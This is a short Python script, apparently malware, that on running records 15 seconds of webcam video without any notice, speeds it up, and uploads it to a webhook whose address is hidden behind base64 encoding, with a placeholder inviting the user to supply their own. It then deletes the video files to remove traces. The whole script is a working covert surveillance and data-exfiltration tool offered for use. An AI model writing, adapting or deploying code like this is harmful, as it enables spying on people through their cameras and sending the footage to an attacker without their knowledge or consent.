import os
from moviepy.editor import VideoFileClip 
import moviepy.video.fx.all as vfx
import imageio
import requests
import moviepy
import time
import subprocess
import base64

def CHEESE():
    aufnahme_dauer = 15
    webcam_index = 0
    cap = imageio.get_reader(f"<video{webcam_index}>", 'ffmpeg')
    fps = 30
    output_datei = 'input.mp4'
    writer = imageio.get_writer(output_datei, fps=fps, codec='libx264')
    startzeit = time.time()
    for frame in cap:
        writer.append_data(frame)
        if int(time.time() - startzeit) >= aufnahme_dauer:
            break
    writer.close()
    in_loc = 'input.mp4'
    out_loc = 'video.mp4'
    clip = VideoFileClip(in_loc)
    clip = clip.set_fps(clip.fps * 4)
    final = clip.fx(vfx.speedx, 4)
    final.write_videofile(out_loc)
    subprocess.run("del input.mp4", shell=True)
    b = "YOUR BASE64 ENCODED WEBHOOK HERE! DOWNLOAD THE BASE64WEBHOOKENCODER TO USE THIS"
    webhook_url = base64.b64decode(b).decode("utf-8")
    dateipfad = 'video.mp4'
    with open(dateipfad, 'rb') as f:
        dateiinhalt = f.read()
    payload = {
        'file': ('video.mp4', dateiinhalt)
    }
    response = requests.post(webhook_url, files=payload)
    subprocess.run("del video.mp4", shell=True)
CHEESE()
